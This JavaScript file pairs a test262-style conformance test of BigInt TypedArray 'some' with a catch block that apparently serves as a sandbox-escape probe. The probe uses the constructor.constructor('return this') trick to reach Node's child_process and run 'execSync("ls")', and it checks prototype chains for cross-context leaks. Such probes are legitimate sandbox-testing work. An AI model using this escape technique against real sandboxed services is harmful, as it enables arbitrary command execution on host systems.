try {
    var s = Symbol('1');
    testWithBigIntTypedArrayConstructors(function (TA) {
        var sample = new TA(42);
        [
            true,
            1,
            'test262',
            s,
            {},
            [],
            -1,
            Infinity,
            -Infinity,
            0.1,
            -0.1
        ].forEach(function (val) {
            var called = 0;
            var result = sample.some(function () {
                called++;
                if (called == 1) {
                    return false;
                }
                return val;
            });
            assert.sameValue(called, 2, 'callbackfn called for each index property');
            var msg = 'result is true - ' + (val === s ? 'symbol' : val);
            assert.sameValue(result, true, msg);
        });
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}